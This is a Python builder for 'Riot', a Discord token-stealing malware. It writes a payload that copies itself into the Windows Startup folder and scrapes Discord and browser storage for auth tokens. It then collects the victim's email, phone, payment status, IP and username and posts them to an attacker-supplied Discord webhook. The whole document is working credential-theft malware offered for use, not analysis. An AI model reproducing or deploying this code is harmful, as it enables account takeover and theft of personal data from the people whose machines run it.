from pystyle import Colorate, Colors, System, Center, Write, Anime


def mkdata(webhook: str, ping: bool) -> str:
    return r"""# by billythegoat356

# https://github.com/billythegoat356/Riot



from genericpath import isfile
from requests import get, post
from os import getenv, listdir, startfile
from os.path import isdir
from re import findall

from json import dumps
from shutil import copy



path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/riot.pyw" % getenv("userprofile")


if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()



webhook = '""" + webhook + r"""'
pingme = """ + ping + r"""


class Discord:

    def setheaders(token: str) -> dict:
        return {"Authorization": token}

    def get_tokens() -> list:
        tokens = []
        LOCAL = getenv("LOCALAPPDATA")
        ROAMING = getenv("APPDATA")
        PATHS = {
            "Discord": ROAMING + "\\Discord",
            "Discord Canary": ROAMING + "\\discordcanary",
            "Discord PTB": ROAMING + "\\discordptb",
            "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
            "Opera": ROAMING + "\\Opera Software\\Opera Stable",
            "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
        }

        def search(path: str) -> list:
            path += "\\Local Storage\\leveldb"
            found_tokens = []
            if isdir(path):
                for file_name in listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                        continue
                    for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                            for token in findall(regex, line):
                                if (
                                    get(
                                        "https://discord.com/api/v9/users/@me",
                                        headers=Discord.setheaders(token),
                                    ).status_code == 200
                                    and token not in found_tokens
                                    and token not in tokens
                                ):
                                    found_tokens.append(token)

            return found_tokens

        for path in PATHS:
            for token in search(PATHS[path]):
                tokens.append(token)
        return tokens

class Grab:

    def token_grab(token: str):
        def getavatar(uid, aid) -> str:
            url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}"
            if get(url).status_code != 200:
                url += ".gif"
            return url

        def has_payment_methods(token) -> bool:
            has = False
            try:
                has = bool(get("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                           headers=Discord.setheaders(token)).json())
            except:
                pass
            return has

        valid, invalid = "<:valide:858700826499219466>", "<:invalide:858700726905733120>"

        def verify(var):
            return valid if var else invalid

        user_data = get("https://discordapp.com/api/v6/users/@me",
                        headers=Discord.setheaders(token)).json()
        ip = get('http://ipinfo.io/json').json()['ip']
        computer_username = getenv("username")
        username = user_data["username"] + \
            "#" + str(user_data["discriminator"])
        user_id = user_data["id"]
        avatar_id = user_data["avatar"]
        avatar_url = getavatar(user_id, avatar_id)
        email = user_data.get("email")
        phone = user_data.get("phone")
        mfa_enabled = bool(user_data['mfa_enabled'])
        email_verified = bool(user_data['verified'])
        billing = bool(has_payment_methods(token))
        nitro = bool(user_data.get("premium_type"))

        nitro = valid if nitro else invalid
        email_verified = verify(email_verified)
        billing = verify(billing)
        mfa_enabled = verify(mfa_enabled)

        if not phone:
            phone = invalid

        data = [{
            "title": "Riot",
            "description": "Grabbed!",
            "url": "https://github.com/billythegoat356/Riot",
            "image": {
                "url": "https://repository-images.githubusercontent.com/414716027/e3031476-fa45-48e0-8d08-f2c621d5a588"
            },
            "color": 0x1D5EFF,
            "fields": [
                {
                    "name": "**Infos Du Compte**",
                            "value": f'Email: {email}\nTéléphone: {phone}\nPaiement: {billing}',
                            "inline": True
                },
                {
                    "name": "**Infos du PC**",
                            "value": f"IP: {ip}\nUtilisateur: {computer_username}",
                            "inline": True
                },
                {
                    "name": "**Infos Supplémentaires**",
                            "value": f'Nitro: {nitro}\n2FA: {mfa_enabled}',
                            "inline": False
                },
                {
                    "name": "**Token**",
                            "value": f"||{token}||",
                            "inline": False
                }
            ],
            "author": {
                "name": f"{username}",
                        "icon_url": avatar_url
            },

            "thumbnail": {
                "url": "https://repository-images.githubusercontent.com/414716027/e3031476-fa45-48e0-8d08-f2c621d5a588"
            },

            "footer": {
                "text": "by billythegoat356"
            }
        }]
        Grab.send(data)

    def send(data: str):
        data = {"username": "Riot",
                "avatar_url": "https://repository-images.githubusercontent.com/414716027/e3031476-fa45-48e0-8d08-f2c621d5a588",
                "embeds": data,
                "content": "@everyone" if pingme else ""}
        return post(webhook, data=dumps(data), headers={"content-type":"application/json"})


sent_tokens = []

def token_grab():
    for token in Discord.get_tokens():
        if token not in sent_tokens:
            Grab.token_grab(token)
        sent_tokens.append(token)


ready_data = [{
    "title": "Riot",
    "description": "Initialized!",
    "url": "https://github.com/billythegoat356/Riot",
    "image": {
        "url": "https://repository-images.githubusercontent.com/414716027/e3031476-fa45-48e0-8d08-f2c621d5a588"
    },
    "color": 0x1D5EFF,
    "fields": [
        {
            "name": "**Ready!**",
            "value": 'I am ready to find some tokens!',
            "inline": True
        }
    ],

    "thumbnail": {
        "url": "https://repository-images.githubusercontent.com/414716027/e3031476-fa45-48e0-8d08-f2c621d5a588"
    },

    "footer": {
        "text": "by billythegoat356"
    }
}]

Grab.send(ready_data)


while True:
    if not isfile(__file__):
        exit()
    token_grab()

"""


riot = '''
    ..      ...        .                     s
 :~"8888x :"%888x     @88>                  :8
8    8888Xf  8888>    %8P          u.      .88
88x. ?8888k  8888X     .     ...ue888b    :888ooo
8888L'8888X  '%88X   .@88u   888R Y888r -*8888888
"888X 8888X:xnHH(`` ''888E`  888R I888>   8888
  ?8~ 8888X X8888     888E   888R I888>   8888
-~`   8888> X8888     888E   888R I888>   8888
:H8x  8888  X8888     888E  u8888cJ888   .8888Lu=
8888> 888~  X8888     888&   "*888*P"    ^%888*
48"` '8*~   `8888!`   R888"    'Y"         'Y"
 ^-==""      `""       ""'''[1:]


banner = r'''
 n                                                                 :.
 E%                                                                :"5
z  %                                                              :" `
K   ":                                                           z   R
?     %.                                                       :^    J
 ".    ^s                                                     f     :~
  '+.    #L                                                 z"    .*
    '+     %L                                             z"    .~
      ":    '%.                                         .#     +
        ":    ^%.                                     .#`    +"
          #:    "n                                  .+`   .z"
            #:    ":                               z`    +"
              %:   `*L                           z"    z"
                *:   ^*L                       z*   .+"
                  "s   ^*L                   z#   .*"
                    #s   ^%L               z#   .*"
                      #s   ^%L           z#   .r"
                        #s   ^%.       u#   .r"
                          #i   '%.   u#   .@"
                            #s   ^%u#   .@"
                              #s x#   .*"
                               x#`  .@%.
                             x#`  .d"  "%.
                           xf~  .r" #s   "%.
                     u   x*`  .r"     #s   "%.  x.
                     %Mu*`  x*"         #m.  "%zX"
                     :R(h x*              "h..*dN.
                   u@NM5e#>                 7?dMRMh.
                 z$@M@$#"#"                 *""*@MM$hL
               u@@MM8*                          "*$M@Mh.
             z$RRM8F"                             "N8@M$bL
            5`RM$#                                  'R88f)R
            'h.$"                                     #$x*'''[1:]


System.Clear()
System.Size(150, 50)
System.Title("Riot")


Anime.Fade(Center.Center(banner), Colors.blue_to_cyan,
           Colorate.Vertical, enter=True)


def main():
    System.Clear()

    print("\n"*2)
    print(Colorate.DiagonalBackwards(Colors.blue_to_cyan, Center.XCenter(riot)))
    print("\n"*5)

    webhook = Write.Input("Enter your webhook -> ",
                          Colors.blue_to_cyan, interval=0.005)

    if not webhook.strip():
        Colorate.Error("Please enter a valid webhook!")
        return

    ping = Write.Input("Would you like to get pinged when you get a hit [y/n] -> ",
                       Colors.blue_to_cyan, interval=0.005)
    
    if ping not in ('y', 'n'):
        Colorate.Error("Please enter either 'y' or 'n'!")
        return
    
    ping = ping == 'y'

    data = mkdata(webhook=webhook, ping=ping)
    with open("riot.pyw", 'w', encoding='utf-8') as f:
        f.write(data)

    print()
    Write.Input("Built!", Colors.cyan_to_blue, interval=0.005)


if __name__ == '__main__':
    while True:
        main()
